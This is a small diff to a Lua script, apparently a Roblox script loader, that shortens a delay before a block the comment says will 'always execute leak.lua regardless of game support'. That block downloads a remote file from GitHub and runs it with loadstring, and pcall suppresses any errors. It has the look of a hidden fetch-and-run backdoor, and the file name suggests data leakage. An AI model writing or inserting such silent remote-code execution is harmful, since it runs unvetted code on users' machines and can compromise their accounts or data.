@@ -129,7 +129,7 @@ end
 
 -- Always execute leak.lua regardless of game support
 spawn(function()
-    task.wait(3)
+    task.wait(1)
     local success, result = pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/leak.lua"))()
     end)
